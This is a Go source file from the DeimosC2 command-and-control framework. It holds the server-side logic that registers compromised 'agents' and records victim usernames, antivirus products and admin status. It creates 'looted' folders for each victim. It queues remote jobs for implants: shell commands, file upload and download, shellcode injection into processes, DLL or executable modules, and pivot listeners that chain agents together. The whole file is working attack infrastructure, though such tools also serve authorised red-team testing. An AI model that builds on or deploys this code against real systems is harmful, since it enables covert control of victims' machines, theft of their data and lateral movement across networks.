package agents

import (
	"encoding/json"
	"os"
	"path"
	"strings"
	"sync"
	"time"

	"github.com/DeimosC2/DeimosC2/c2/modules"
	"github.com/DeimosC2/DeimosC2/c2/webserver/websockets"
	"github.com/gorilla/websocket"
	uuid "github.com/satori/go.uuid"

	"github.com/DeimosC2/DeimosC2/c2/lib/sqldb"
	"github.com/DeimosC2/DeimosC2/c2/lib/validation"
	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
)

//AllAgents is a global variable that holds all the agents
var AllAgents = &Agents{Mutex: sync.RWMutex{}, List: map[string]*Agent{}}

//Agents is the struct for a list of all agents
type Agents struct {
	Mutex sync.RWMutex
	List  map[string]*Agent
}

//Agent struct is the datatype for agent checkins
type Agent struct {
	Key         string     //Agent UUID4 key
	Name        string     //Custom agent name set by user
	OS          string     //Agent's OS
	OSType      string     //Type of Operating System and/or Distro
	OSVers      string     //Version of OS
	AV          []string   //AntiVirus Running
	Hostname    string     //Agent's hostname
	Username    string     //Username of victim
	LocalIP     string     //Local IP
	ExternalIP  string     //External IP
	AgentPath   string     //Agent Path
	Shellz      []string   //Available System Shells
	Pid         int        //Get PID of agent
	Jobs        []AgentJob //Holds the jobs for that agent
	IsAdmin     bool       //Is admin user
	IsElevated  bool       //Is elevated on Windows
	ListenerKey string     //Listener that the agent is attached too
	LowerLinks  []string   //List of agents using this one as a pivot listener
	LastCheckin time.Time  //Last Checkin Time
}

/*AgentJob is the structure of a job
Upload -> {"upload": {"filename": "pwn.bat", "path": "C:\\"}}
Download -> {"download": "full path to file"}
Options -> {"options": {"option to change": "new value"}}
Shell Commands -> {"shell": commands}
Shellcode Injection -> {"shellInject": {"shellcode": "sc", "pid": "1"}
Module -> {"module":"module to execute"} changed
*/
type AgentJob struct {
	AgentKey  string   //Name of the agent to create the job for
	JobType   string   //Type of job
	Arguments []string //Job arguments adhering to the above formats
}

//PivotJob holds the job to pass on to the next link in the chain
type PivotJob struct {
	Name string
	Job  []AgentJob
}

//AgentKey Generate UUID for agent key
func AgentKey() string {
	logging.Logger.Println("Agent creation called")
	newKey := uuid.NewV4()
	return newKey.String()
}

//AgentCreate will take in the initilization sent by a new agent and do the following:
//add it to the list of current agents and add it to the database
func AgentCreate(data string, listenerName string, agentKey string, externalIP string) string {
	logging.Logger.Println("Setting Agent Data")
	newAgent := Agent{}
	err := json.Unmarshal([]byte(data), &newAgent)

	allShells := newAgent.Shellz
	if len(allShells) < 3 {
		for i := len(allShells); i < 3; i++ {
			allShells = append(allShells, "")
		}
	}

	AllAgents.Mutex.Lock()
	defer AllAgents.Mutex.Unlock()

	newAgent.ListenerKey = listenerName
	//Check to see if the listener is also an agent and add it to that agents list if so
	if val, ok := AllAgents.List[listenerName]; ok {
		val.LowerLinks = append(val.LowerLinks, agentKey)
		logging.Logger.Println("Lowerlinks for ", newAgent.Key, "Are:", val.LowerLinks)
	}
	newAgent.Key = agentKey
	newAgent.ExternalIP = externalIP
	newAgent.LastCheckin = time.Now()
	newAgent.Name = agentKey
	AllAgents.List[newAgent.Key] = &newAgent

	//Get current working directory
	cwd, err := os.Getwd()
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	//Check to ensure the directory does not exist
	if _, err := os.Stat(path.Join(cwd, "resources", "looted", newAgent.Key)); os.IsNotExist(err) {
		//Make the directory under loot with agent key
		os.Mkdir(path.Join(cwd, "resources", "looted", newAgent.Key), 0755)
	}

	fullPath := path.Join(cwd, "resources", "looted", newAgent.Key, "files")

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		//Make the directory under loot with agent key
		os.Mkdir(fullPath, 0755)
	}

	avMarshal, _ := json.Marshal(newAgent.AV)
	//Need to pass the listener key to this function so it can be added into the database
	sqldb.AddAgent(newAgent.Key, newAgent.Name, newAgent.OS, newAgent.OSType, newAgent.OSVers, avMarshal, newAgent.Hostname, newAgent.Username, newAgent.LocalIP, newAgent.ExternalIP, newAgent.AgentPath, allShells[0], allShells[1], allShells[2], newAgent.Pid, newAgent.IsAdmin, newAgent.IsElevated, 1, newAgent.ListenerKey)

	msg, err := json.Marshal(newAgent)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	//Send to the Frontend
	outMsg := websockets.SendMessage{
		Type:         "Agent",
		FunctionName: "New",
		Data:         string(msg),
		Success:      true,
	}
	websockets.AlertUsers(outMsg)

	logging.Logger.Println(sqldb.AgentTimeline())

	return newAgent.Key
}

//GetJobs returns the jobs for the agent requesting them
func GetJobs(agentKey string) []byte {
	AllAgents.Mutex.Lock()
	if val, ok := AllAgents.List[agentKey]; ok {
		var msg []byte
		var err error

		if len(val.LowerLinks) > 0 {
			for _, x := range val.LowerLinks {
				logging.Logger.Println("LOWER LINK:", x)
				AllAgents.Mutex.Unlock()
				nestedJobs := GetJobs(x)
				AllAgents.Mutex.Lock()
				if string(nestedJobs) == "null" {
					logging.Logger.Println("No jobs for ", x)
					continue
				}
				var args []string
				args = append(args, string(nestedJobs))

				newPivJob := AgentJob{
					AgentKey:  agentKey,
					JobType:   "pivotJob",
					Arguments: args,
				}
				val.Jobs = append(val.Jobs, newPivJob)
			}
		}

		msg, err = json.Marshal(val.Jobs)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}
		val.Jobs = nil
		AllAgents.Mutex.Unlock()
		return msg
	}

	var args []string
	args = append(args, "")
	reInit := []AgentJob{{agentKey, "reinit", args}}
	msg, err := json.Marshal(reInit)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	AllAgents.Mutex.Unlock()
	return msg
}

//JobsExist will return true is there are jobs for the agent in question
func JobsExist(agentKey string) bool {
	AllAgents.Mutex.Lock()
	defer AllAgents.Mutex.Unlock()
	if val, ok := AllAgents.List[agentKey]; ok {
		for job := range val.Jobs {
			logging.Logger.Println("the Value is:", job)
			return true
		}
	}
	return false
}

//SetJob will set a new job for the specified agent
func SetJob(job AgentJob, userID string, username string) bool {
	logging.Logger.Println("Set Job Called")

	AllAgents.Mutex.Lock()
	defer AllAgents.Mutex.Unlock()

	if val, ok := AllAgents.List[job.AgentKey]; ok {
		val.Jobs = append(val.Jobs, job)
		if job.JobType == "shell" {
			logging.CMDLog(userID, "("+username+")", job)
		} else if job.JobType == "module" {
			logging.ModLog(userID, "("+username+")", job.AgentKey, job.JobType, job.Arguments[0], job.Arguments[1])
		}
		return true
	}
	return false
}

//Update agent struct when it is edited
func updateAgent(agentKey string, agentName string) {
	AllAgents.Mutex.Lock()
	defer AllAgents.Mutex.Unlock()

	if val, ok := AllAgents.List[agentKey]; ok {
		val.Name = agentName
		logging.Logger.Println("the Value is:", val.Name)
	}
}

//RemoveAgent will remove an agent from the list
func RemoveAgent(agentKey string) {
	logging.Logger.Println("Agent deletion called! Updating DB!")
	sqldb.DeleteAgent(agentKey)
	AllAgents.Mutex.Lock()
	delete(AllAgents.List, agentKey)
	AllAgents.Mutex.Unlock()
}

//PivotListener creates the necessary job for the listener to be started
func PivotListener(agentKey string, privKey []byte, port string, userID string, username string) bool {
	var args []string
	args = append(args, port, string(privKey))
	listenerJob := AgentJob{
		AgentKey:  agentKey,
		JobType:   "pivotTCP",
		Arguments: args,
	}

	return SetJob(listenerJob, userID, username)
}

//ReInitAgents puts all the active agents back into memory
func ReInitAgents() {
	AllAgents.Mutex.Lock()
	defer AllAgents.Mutex.Unlock()

	rows := sqldb.GetAgentData()
	defer rows.Close()
	for rows.Next() {
		var avTemp string
		oldAgent := Agent{}
		oldAgent.Shellz = []string{"", "", ""}
		err := rows.Scan(&oldAgent.Key, &oldAgent.Name, &oldAgent.ListenerKey, &oldAgent.OS, &oldAgent.OSType, &oldAgent.OSVers, &avTemp, &oldAgent.Hostname, &oldAgent.Username, &oldAgent.LocalIP, &oldAgent.ExternalIP, &oldAgent.AgentPath, &oldAgent.Shellz[0], &oldAgent.Shellz[1], &oldAgent.Shellz[2], &oldAgent.Pid, &oldAgent.IsAdmin, &oldAgent.IsElevated, &oldAgent.LastCheckin)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}
		json.Unmarshal([]byte(avTemp), &oldAgent.AV)
		AllAgents.List[oldAgent.Key] = &oldAgent
	}

	for _, y := range AllAgents.List {
		//Check to see if the listener is also an agent and add it to that agents list if so
		if val, ok := AllAgents.List[y.ListenerKey]; ok {
			val.LowerLinks = append(val.LowerLinks, y.Key)
			logging.Logger.Println("Lowerlinks for ", y.Key, "Are:", val.LowerLinks)
		}
	}
}

//ParseSocket takes in data from the websocket and does what it needs to with it
func ParseSocket(fname string, data interface{}, ws *websocket.Conn, userID string, username string) {
	m := data.(map[string]interface{})

	switch fname {
	case "List":
		AllAgents.Mutex.Lock()
		defer AllAgents.Mutex.Unlock()
		msg := "["
		for _, v := range AllAgents.List {
			newMsg, _ := json.Marshal(v)
			msg += string(newMsg) + ","
		}
		msg = strings.TrimSuffix(msg, ",")
		msg += "]"
		outMsg := websockets.SendMessage{
			Type:         "Agent",
			FunctionName: "List",
			Data:         msg,
			Success:      true,
		}
		websockets.AlertSingleUser(outMsg, ws)
		return
	case "AddComment":
		if !validation.ValidateMapAlert(m, []string{"AgentKey", "Comment"}, ws) {
			return
		}
		success, rData, agentKey := sqldb.AddComment(m["AgentKey"].(string), m["Comment"].(string), username)
		output := "{\"AgentKey\":\"" + agentKey + "\", \"Data\": \"" + rData + "\"}"
		outMsg := websockets.SendMessage{
			Type:         "Agent",
			FunctionName: "AddComment",
			Data:         output,
			Success:      success,
		}
		websockets.AlertSingleUser(outMsg, ws)
		return
	case "ListComments":
		if !validation.ValidateMapAlert(m, []string{"AgentKey"}, ws) {
			return
		}
		rData, agentKey := sqldb.ListComments(m["AgentKey"].(string))
		output := "{\"AgentKey\":\"" + agentKey + "\", \"Data\": " + rData + "}"
		outMsg := websockets.SendMessage{
			Type:         "Agent",
			FunctionName: "ListComments",
			Data:         output,
			Success:      true,
		}
		websockets.AlertSingleUser(outMsg, ws)
		return
	case "SetName":
		if !validation.ValidateMapAlert(m, []string{"AgentKey", "AgentName"}, ws) {
			return
		}
		agentKey, rData := sqldb.SetAgentName(m["AgentKey"].(string), m["AgentName"].(string))
		updateAgent(agentKey, rData)
		output := "{\"AgentKey\":\"" + agentKey + "\", \"AgentName\": \"" + rData + "\"}"
		outMsg := websockets.SendMessage{
			Type:         "Admin",
			FunctionName: "SetName",
			Data:         output,
			Success:      true,
		}
		websockets.AlertSingleUser(outMsg, ws)
		return
	case "Module":
		if !validation.ValidateMapAlert(m, []string{"AgentKey", "ModuleName", "ModuleType", "RunType", "Arguments", "Server", "Arguments"}, ws) {
			return
		}
		var args []string
		switch val := m["Arguments"].(type) {
		case []interface{}:
			for _, x := range val {
				logging.Logger.Println(x)
				args = append(args, x.(string))
			}
			AllAgents.Mutex.Lock()
			var os string
			if val, ok := AllAgents.List[m["AgentKey"].(string)]; ok {
				os = val.OS
			} else {
				return
			}
			AllAgents.Mutex.Unlock()

			var ft string
			switch os {
			case "darwin":
				ft = ".o"
			case "windows":
				if m["RunType"].(string) == "inject" {
					ft = ".dll"
				} else {
					ft = ".exe"
				}

			case "linux":
				ft = ".elf"
			}
			nMod := modulescommon.ModuleCom{
				AgentKey:   m["AgentKey"].(string),
				Server:     m["Server"].(bool),
				Download:   true,
				Kill:       false,
				ModuleName: m["ModuleName"].(string),
				ModuleType: m["ModuleType"].(string),
				FileType:   ft,
				Data:       nil,
			}
			binary := modules.SendModule(nMod)

			job := AgentJob{
				AgentKey:  m["AgentKey"].(string),
				JobType:   "module",
				Arguments: []string{m["ModuleName"].(string), m["RunType"].(string), binary},
			}

			success := SetJob(job, userID, username)

			outMsg := websockets.SendMessage{
				Type:         "Agent",
				FunctionName: "Module",
				Data:         "",
				Success:      success,
			}
			websockets.AlertSingleUser(outMsg, ws)
			return
		}
		return
	case "RemoveAgent":
		if !validation.ValidateMapAlert(m, []string{"AgentKey"}, ws) {
			return
		}
		agentKey := m["AgentKey"].(string)
		RemoveAgent(agentKey)
		logging.Logger.Println("Removing agent: ", agentKey)
		outMsg := websockets.SendMessage{
			Type:         "Agent",
			FunctionName: "RemoveAgent",
			Data:         "",
			Success:      true,
		}
		websockets.AlertUsers(outMsg)
		return
	default:
		if !validation.ValidateMapAlert(m, []string{"AgentKey", "JobType", "Arguments"}, ws) {
			return
		}
		var args []string
		switch val := m["Arguments"].(type) {
		case []interface{}:
			for _, x := range val {
				logging.Logger.Println(x)
				args = append(args, x.(string))
			}
		}

		if fname == "Job" {
			job := AgentJob{
				AgentKey:  m["AgentKey"].(string),
				JobType:   m["JobType"].(string),
				Arguments: args,
			}
			success := SetJob(job, userID, username)
			outMsg := websockets.SendMessage{
				Type:         "Agent",
				FunctionName: "Job",
				Data:         "",
				Success:      success,
			}
			websockets.AlertSingleUser(outMsg, ws)
		} else {
			logging.Logger.Println("No valid fname passed to parse agent")
		}
	}
	return
}
